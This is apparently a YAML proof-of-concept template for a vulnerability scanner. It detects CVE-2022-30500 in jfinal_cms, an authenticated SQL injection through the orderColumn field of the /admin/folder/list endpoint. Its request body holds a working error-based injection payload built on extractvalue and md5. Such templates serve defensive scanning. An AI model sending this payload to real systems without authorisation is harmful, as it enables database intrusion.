name: poc-yaml-jfinalcms-cve-2022-30500-sqli
binding: 9f6a831e-8e4c-4de4-83d9-122ffee0b687
manual: true
detail:
    author: ct
    links:
        - https://jcyj.chd.edu.cn/2022/0627/c5172a220661/page.htm
        - https://github.com/jflyfox/jfinal_cms/issues/35
    vulnerability:
        id: CT-436094
        level: critical
    check_action: 需要认证登陆
transport: http
set:
    s1: randomInt(100000, 200000)
rules:
    r1:
        request:
            cache: true
            method: POST
            path: /admin/folder/list
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                form.orderColumn= and extractvalue(1,concat(0x7e,md5({{s1}})))-- a&form.orderAsc=&attr.name=&attr.status=-1&totalRecords=12&pageNo=1&pageSize=20&length=10
        expression: |
            response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
expression: r1()
